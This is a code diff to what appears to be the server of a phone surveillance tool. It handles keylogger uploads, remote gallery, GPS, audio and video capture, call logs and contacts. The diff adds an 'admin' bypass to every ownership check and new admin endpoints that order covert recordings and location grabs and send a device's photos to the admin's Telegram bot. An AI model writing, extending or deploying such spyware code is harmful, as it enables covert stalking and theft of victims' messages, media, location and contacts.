@@ -89,7 +89,6 @@ async function setupDatabase() {
     await pool.query(`ALTER TABLE devices ADD COLUMN IF NOT EXISTS device_token TEXT`);
     await pool.query(`ALTER TABLE devices ADD COLUMN IF NOT EXISTS owner_user_id INTEGER`);
 
-    // ফিচার লক/আনলক টেবিল
     await pool.query(`
       CREATE TABLE IF NOT EXISTS device_features (
         device_id VARCHAR(255) PRIMARY KEY,
@@ -102,7 +101,6 @@ async function setupDatabase() {
       );
     `);
 
-    // ইউজারের Telegram সেটিংস
     await pool.query(`
       CREATE TABLE IF NOT EXISTS user_telegram (
         user_id INTEGER PRIMARY KEY REFERENCES users(id) ON DELETE CASCADE,
@@ -210,7 +208,6 @@ app.post("/api/device-state", async (req, res) => {
         "INSERT INTO devices (owner_user_id, device_id, device_token, device_name, battery, online, last_seen) VALUES ($1,$2,$3,$4,$5,TRUE,CURRENT_TIMESTAMP)",
         [userId, deviceId, deviceToken, deviceName || "Unknown Device", battery ?? 0]
       );
-      // ডিফল্ট ফিচার পারমিশন
       await pool.query("INSERT INTO device_features (device_id) VALUES ($1) ON CONFLICT DO NOTHING", [deviceId]);
     }
 
@@ -227,11 +224,12 @@ app.post("/api/device-state", async (req, res) => {
   } catch (e) { console.error(e); res.status(500).json({ error: "State update failed" }); }
 });
 
+// GET device-state (admin bypass)
 app.get("/api/device-state", requireLogin, async (req, res) => {
   const { deviceId } = req.query;
   if (!deviceId) return res.status(400).json({ error: "deviceId required" });
   const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
-  if (deviceRes.rows.length === 0 || deviceRes.rows[0].owner_user_id !== req.session.userId) {
+  if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) {
     return res.status(403).json({ error: "Not your device." });
   }
   const live = deviceStates.get(deviceId);
@@ -241,6 +239,12 @@ app.get("/api/device-state", requireLogin, async (req, res) => {
 
 app.get("/api/devices", requireLogin, async (req, res) => {
   try {
+    if (req.session.role === 'admin') {
+      const result = await pool.query(
+        "SELECT device_id, device_name AS name, battery, online, last_seen FROM devices ORDER BY created_at DESC"
+      );
+      return res.json(result.rows);
+    }
     const result = await pool.query(
       "SELECT device_id, device_name AS name, battery, online, last_seen FROM devices WHERE owner_user_id=$1 ORDER BY created_at DESC",
       [req.session.userId]
@@ -266,7 +270,6 @@ app.post("/api/keylog", async (req, res) => {
     if (!deviceId || !deviceToken || !text) return res.status(400).json({ error: "deviceId, deviceToken and text required" });
     const deviceRes = await pool.query("SELECT device_token FROM devices WHERE device_id=$1", [deviceId]);
     if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) return res.status(401).json({ error: "Invalid device token." });
-    // ফিচার লক চেক
     const feature = await pool.query("SELECT keylogger FROM device_features WHERE device_id=$1", [deviceId]);
     if (feature.rows.length > 0 && feature.rows[0].keylogger === false) {
       return res.status(403).json({ error: "Keylogger disabled by admin." });
@@ -280,7 +283,7 @@ app.get("/api/keylog", requireLogin, async (req, res) => {
   const { deviceId } = req.query;
   if (!deviceId) return res.status(400).json({ error: "deviceId required" });
   const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
-  if (deviceRes.rows.length === 0 || deviceRes.rows[0].owner_user_id !== req.session.userId) return res.status(403).json({ error: "Not your device." });
+  if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) return res.status(403).json({ error: "Not your device." });
   res.json(keylogs.filter(k => k.deviceId === deviceId));
 });
 
@@ -289,10 +292,9 @@ app.post("/api/gallery/request", requireLogin, async (req, res) => {
   const { deviceId, count } = req.body;
   if (!deviceId) return res.status(400).json({ error: "deviceId required" });
   const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
-  if (deviceRes.rows.length === 0 || deviceRes.rows[0].owner_user_id !== req.session.userId) {
+  if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) {
     return res.status(403).json({ error: "Not your device." });
   }
-  // ফিচার লক চেক
   const feature = await pool.query("SELECT gallery FROM device_features WHERE device_id=$1", [deviceId]);
   if (feature.rows.length > 0 && feature.rows[0].gallery === false) {
     return res.status(403).json({ error: "Gallery disabled by admin." });
@@ -337,7 +339,7 @@ app.get("/api/gallery", requireLogin, async (req, res) => {
   const { deviceId } = req.query;
   if (!deviceId) return res.status(400).json({ error: "deviceId required" });
   const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
-  if (deviceRes.rows.length === 0 || deviceRes.rows[0].owner_user_id !== req.session.userId) {
+  if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) {
     return res.status(403).json({ error: "Not your device." });
   }
   const media = galleryData.get(deviceId) || [];
@@ -349,7 +351,7 @@ app.post("/api/gps/request", requireLogin, async (req, res) => {
   const { deviceId } = req.body;
   if (!deviceId) return res.status(400).json({ error: "deviceId required" });
   const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
-  if (deviceRes.rows.length === 0 || deviceRes.rows[0].owner_user_id !== req.session.userId) {
+  if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) {
     return res.status(403).json({ error: "Not your device." });
   }
   const feature = await pool.query("SELECT gps FROM device_features WHERE device_id=$1", [deviceId]);
@@ -377,7 +379,7 @@ app.post("/api/audio/request", requireLogin, async (req, res) => {
       return res.status(400).json({ error: "Duration must be between 10 and 300 seconds." });
     }
     const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
-    if (deviceRes.rows.length === 0 || deviceRes.rows[0].owner_user_id !== req.session.userId) {
+    if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) {
       return res.status(403).json({ error: "Not your device." });
     }
     const feature = await pool.query("SELECT audio FROM device_features WHERE device_id=$1", [deviceId]);
@@ -423,7 +425,7 @@ app.get("/api/audio/list", requireLogin, async (req, res) => {
   const { deviceId } = req.query;
   if (!deviceId) return res.status(400).json({ error: "deviceId required" });
   const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
-  if (deviceRes.rows.length === 0 || deviceRes.rows[0].owner_user_id !== req.session.userId) {
+  if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) {
     return res.status(403).json({ error: "Not your device." });
   }
   const dir = path.join(__dirname, 'uploads', 'audio');
@@ -450,7 +452,7 @@ app.post("/api/video/request", requireLogin, async (req, res) => {
       return res.status(400).json({ error: "Duration must be between 5 and 30 seconds." });
     }
     const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
-    if (deviceRes.rows.length === 0 || deviceRes.rows[0].owner_user_id !== req.session.userId) {
+    if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) {
       return res.status(403).json({ error: "Not your device." });
     }
     const feature = await pool.query("SELECT video FROM device_features WHERE device_id=$1", [deviceId]);
@@ -497,7 +499,7 @@ app.get("/api/video/list", requireLogin, async (req, res) => {
   const { deviceId } = req.query;
   if (!deviceId) return res.status(400).json({ error: "deviceId required" });
   const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
-  if (deviceRes.rows.length === 0 || deviceRes.rows[0].owner_user_id !== req.session.userId) {
+  if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) {
     return res.status(403).json({ error: "Not your device." });
   }
   const dir = path.join(__dirname, 'uploads', 'video');
@@ -564,7 +566,7 @@ app.get("/api/calllogs", requireLogin, async (req, res) => {
   const { deviceId } = req.query;
   if (!deviceId) return res.status(400).json({ error: "deviceId required" });
   const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
-  if (deviceRes.rows.length === 0 || deviceRes.rows[0].owner_user_id !== req.session.userId) {
+  if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) {
     return res.status(403).json({ error: "Not your device." });
   }
   res.json({ callLogs: callLogsData.get(deviceId) || [] });
@@ -574,7 +576,7 @@ app.get("/api/contacts", requireLogin, async (req, res) => {
   const { deviceId } = req.query;
   if (!deviceId) return res.status(400).json({ error: "deviceId required" });
   const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
-  if (deviceRes.rows.length === 0 || deviceRes.rows[0].owner_user_id !== req.session.userId) {
+  if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) {
     return res.status(403).json({ error: "Not your device." });
   }
   res.json({ contacts: contactsData.get(deviceId) || [] });
@@ -607,7 +609,7 @@ app.post("/api/gallery/export", requireLogin, async (req, res) => {
     const { deviceId } = req.body;
     if (!deviceId) return res.status(400).json({ error: "deviceId required" });
     const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
-    if (deviceRes.rows.length === 0 || deviceRes.rows[0].owner_user_id !== req.session.userId) {
+    if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) {
       return res.status(403).json({ error: "Not your device." });
     }
     const media = galleryData.get(deviceId) || [];
@@ -621,7 +623,6 @@ app.post("/api/gallery/export", requireLogin, async (req, res) => {
     const botToken = tgRes.rows[0].bot_token;
     const chatId = tgRes.rows[0].chat_id;
 
-    // Telegram-এ প্রতিটি media পাঠানো (thumbnail base64 থেকে image বানিয়ে)
     for (const item of media) {
       if (!item.thumbnailBase64) continue;
       const imageBuffer = Buffer.from(item.thumbnailBase64, 'base64');
@@ -705,6 +706,82 @@ app.post("/api/admin/device-feature", requireLogin, requireAdmin, async (req, re
     );
     res.json({ success: true });
   } catch (e) { console.error(e); res.status(500).json({ error: "Failed to update feature." }); }
+});
+
+// ================= ADMIN ACTION ENDPOINTS =================
+
+app.post("/api/admin/gps/request", requireLogin, requireAdmin, async (req, res) => {
+  const { deviceId } = req.body;
+  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
+  gpsRequestFlags.set(deviceId, true);
+  res.json({ success: true });
+});
+
+app.post("/api/admin/audio/request", requireLogin, requireAdmin, async (req, res) => {
+  try {
+    const { deviceId, duration } = req.body;
+    if (!deviceId) return res.status(400).json({ error: "deviceId required" });
+    if (!duration || isNaN(duration) || duration < 10 || duration > 300) {
+      return res.status(400).json({ error: "Duration must be between 10 and 300 seconds." });
+    }
+    audioRequestFlags.set(deviceId, { requested: true, duration: Math.floor(duration) });
+    res.json({ success: true, requestedDuration: duration });
+  } catch (e) { console.error(e); res.status(500).json({ error: "Audio request failed" }); }
+});
+
+app.post("/api/admin/video/request", requireLogin, requireAdmin, async (req, res) => {
+  try {
+    const { deviceId, duration, cameraType } = req.body;
+    if (!deviceId) return res.status(400).json({ error: "deviceId required" });
+    if (!duration || isNaN(duration) || duration < 5 || duration > 30) {
+      return res.status(400).json({ error: "Duration must be between 5 and 30 seconds." });
+    }
+    const safeCameraType = (cameraType === 0 || cameraType === 1) ? cameraType : 1;
+    videoRequestFlags.set(deviceId, { requested: true, duration: Math.floor(duration), cameraType: safeCameraType });
+    res.json({ success: true, requestedDuration: duration, cameraType: safeCameraType });
+  } catch (e) { console.error(e); res.status(500).json({ error: "Video request failed" }); }
+});
+
+app.post("/api/admin/gallery/request", requireLogin, requireAdmin, async (req, res) => {
+  const { deviceId, count } = req.body;
+  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
+  const safeCount = Number.isInteger(count) ? Math.min(Math.max(count, 1), 100) : 100;
+  galleryRequestFlags.set(deviceId, { requested: true, count: safeCount });
+  res.json({ success: true, count: safeCount });
+});
+
+app.post("/api/admin/gallery/export", requireLogin, requireAdmin, async (req, res) => {
+  try {
+    const { deviceId } = req.body;
+    if (!deviceId) return res.status(400).json({ error: "deviceId required" });
+
+    const adminRes = await pool.query(
+      "SELECT bot_token, chat_id FROM user_telegram WHERE user_id=$1",
+      [req.session.userId]
+    );
+    if (adminRes.rows.length === 0 || !adminRes.rows[0].bot_token || !adminRes.rows[0].chat_id) {
+      return res.status(400).json({ error: "Admin Telegram settings not configured. Please set bot token and chat ID in Settings." });
+    }
+
+    const botToken = adminRes.rows[0].bot_token;
+    const chatId = adminRes.rows[0].chat_id;
+    const media = galleryData.get(deviceId) || [];
+
+    if (media.length === 0) {
+      return res.json({ success: true, message: "No media to export." });
+    }
+
+    for (const item of media) {
+      if (!item.thumbnailBase64) continue;
+      const imageBuffer = Buffer.from(item.thumbnailBase64, 'base64');
+      await sendPhotoToTelegram(botToken, chatId, imageBuffer, item.filename);
+    }
+
+    res.json({ success: true, message: `Exported ${media.length} items to Telegram.` });
+  } catch (e) {
+    console.error(e);
+    res.status(500).json({ error: "Gallery export failed." });
+  }
 });
 
 // ================= PAGES =================
